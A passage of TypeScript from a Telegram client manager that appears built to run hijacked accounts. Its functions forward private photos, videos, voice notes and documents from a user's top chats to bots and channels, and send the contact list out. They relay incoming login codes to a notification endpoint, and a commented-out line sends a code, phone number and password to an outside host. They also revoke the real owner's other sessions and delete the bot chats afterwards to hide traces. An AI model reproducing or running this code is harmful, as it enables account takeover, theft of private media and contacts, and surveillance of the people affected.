chatId, \"to channel:\", channelId);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);\n                    }\n                }\n                console.log(\"Completed forwarding messages from top private chats to channel:\", channelId);\n            }\n        } catch (e) {\n            console.log(e)\n        }\n        if (channelId) {\n            await this.leaveChannels([channelId.toString()]);\n            await connectionManager.unregisterClient(this.phoneNumber);\n        }\n    }\n\n    public async forwardMediaToBot(fromChatId: string) {\n        const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);\n        try {\n            if (fromChatId) {\n                await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);\n            } else {\n                const chats = await this.getTopPrivateChats();\n                const me = await this.getMe();\n                const finalChats = new Set(chats.map(chat => chat.chatId));\n                finalChats.add(me.id?.toString());\n                for (const bot of bots) {\n                    try {\n                        await this.client.sendMessage(bot, { message: \"Start\" });\n                        await sleep(1000);\n                        await this.client.invoke(\n                            new Api.folders.EditPeerFolders({\n                                folderPeers: [\n                                    new Api.InputFolderPeer({\n                                        peer: await this.client.getInputEntity(bot),\n                                        folderId: 1,\n                                    }),\n                                ],\n                            })\n                        );\n                    } catch (e) {\n                        console.log(e)\n                    }\n                }\n                try {\n                    const contacts = await this.getContacts();\n                    if ('users' in contacts && Array.isArray(contacts.users)) {\n                        await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES), contacts);\n                    } else {\n                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');\n                    }\n                } catch (e) {\n                    console.log(\"Failed To Send Contacts File\", e)\n                }\n                for (const chatId of finalChats) {\n                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });\n                    console.log(\"Media Messages: \", mediaMessages);\n                    const uniqueMessageIds = Array.from(new Set([\n                        ...mediaMessages.photo.messages,\n                        ...mediaMessages.video.messages,\n                        ...mediaMessages.document.messages,\n                        ...mediaMessages.roundVideo.messages,\n                        ...mediaMessages.roundVoice.messages,\n                        ...mediaMessages.voice.messages,\n                    ]));\n                    const chunkSize = 30;\n                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {\n                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);\n                        const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)\n                        await this.client.forwardMessages(bot, {\n                            messages: chunk,\n                            fromPeer: chatId,\n                        });\n                        console.log(`Forwarded ${chunk.length} messages to bot`);\n                    }\n                }\n            }\n        } catch (e) {\n            console.log(e)\n        }\n        for (const bot of bots) {\n            const result = await this.cleanupChat({ chatId: bot, revoke: false });\n            await sleep(1000);\n            await this.deleteChat({ peer: bot, justClear: false });\n            console.log(\"Deleted bot chat:\", result);\n        }\n        await connectionManager.unregisterClient(this.phoneNumber);\n    }\n\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        const limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n        console.log(\"Left the channel with ID:\", toChatId);\n        return;\n    }\n\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            try {\n                console.log(\"Destroying Client: \", this.phoneNumber);\n                await this.cleanupClient();\n                console.log(\"Client Destroyed finally: \", this.phoneNumber);\n            } catch (error) {\n                console.error(\"Error during disconnect:\", error);\n                throw error;\n            }\n        }\n    }\n\n    private async cleanupClient() {\n        try {\n            if (!this.client) return;\n            const handlers = this.client.listEventHandlers();\n            for (const handler of handlers) {\n                this.client.removeEventHandler(handler[1], handler[0]);\n            }\n            console.debug(\"Removing all handlers\");\n            try {\n                if (this.client.connected) {\n                    await this.client.disconnect();\n                }\n                await this.client.destroy();\n                console.debug(\"Client destroyed\");\n            } catch (error) {\n                parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n            }\n            await this.client.destroy();\n            await this.client.disconnect();\n            this.client = null;\n            this.session.delete();\n            this.channelArray = [];\n            this.client = null;\n            await sleep(2000);\n            console.log(\"Client Destroyed: \", this.phoneNumber);\n        } catch (error) {\n            parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n        }\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        // this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams) {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats;\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit });\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (const id of chats) {\n            try {\n                const channelId = id.startsWith('-100') ? id : `-100${id}`;\n                await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: channelId\n                    })\n                );\n                console.log(`${this.phoneNumber} Left channel :`, id);\n                if (chats.length > 1) {\n                    await sleep(3000);\n                }\n\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);\n                break;\n            }\n        }\n        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: Api.Authorization): boolean {\n        const authCriteria = [\n            { field: 'country', value: 'singapore' },\n            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\n            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }\n        ];\n\n        return authCriteria.some(criterion => {\n            if ('values' in criterion) {\n                return criterion.values.some(value =>\n                    auth[criterion.field].toLowerCase().includes(value.toLowerCase())\n                );\n            }\n            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());\n        });\n    }\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async getCallLogsInternal() {\n        const finalResult = {}\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            finalResult[chatId] = filteredResults\n        }\n        return finalResult;\n    }\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory(params));\n            console.log(`Dialog with ID ${params.peer} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    async getMediaMetadata(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 500,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.map(message => {\n            const messageIds: number[] = [];\n            if (message.media) {\n                const mediaType = this.getMediaType(message.media);\n                if (types.includes(mediaType)) {\n                    messageIds.push(message.id);\n                }\n            }\n            return messageIds;\n        }).flat();\n\n        return {\n            messages: filteredMessages,\n            total: messages.total,\n            hasMore: messages.length == limit,\n            lastOffsetId: messages[messages.length - 1].id\n        };\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const entity = await this.safeGetEntity(chatId);\n            const messages = await this.client.getMessages(entity, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB 